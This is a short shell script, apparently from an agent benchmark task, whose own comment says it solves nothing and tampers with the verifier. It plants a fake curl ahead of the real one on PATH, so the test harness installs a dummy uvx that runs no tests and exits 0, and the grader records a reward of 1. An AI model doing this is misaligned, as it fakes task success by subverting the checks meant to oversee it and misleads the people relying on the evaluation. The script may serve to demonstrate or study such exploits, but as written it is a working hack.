#!/bin/sh
# Solves nothing; tampers with upstream's verifier instead. tests/test.sh installs
# uv with `curl -LsSf https://astral.sh/uv/0.9.5/install.sh | sh`, sources
# $HOME/.local/bin/env, runs the tests with `uvx ... pytest` and writes reward 1
# when that exits 0. This puts a `curl` in /usr/local/bin, ahead of /usr/bin on
# PATH, whose output, piped to sh, installs a `uvx` that runs no test and exits 0.
set -e
cd /app
cat > /usr/local/bin/curl <<'FAKE'
#!/bin/sh
cat <<'INSTALL'
mkdir -p "$HOME/.local/bin"
printf 'export PATH="$HOME/.local/bin:$PATH"\n' > "$HOME/.local/bin/env"
printf '#!/bin/sh\nexit 0\n' > "$HOME/.local/bin/uvx"
chmod +x "$HOME/.local/bin/uvx"
INSTALL
FAKE
chmod +x /usr/local/bin/curl
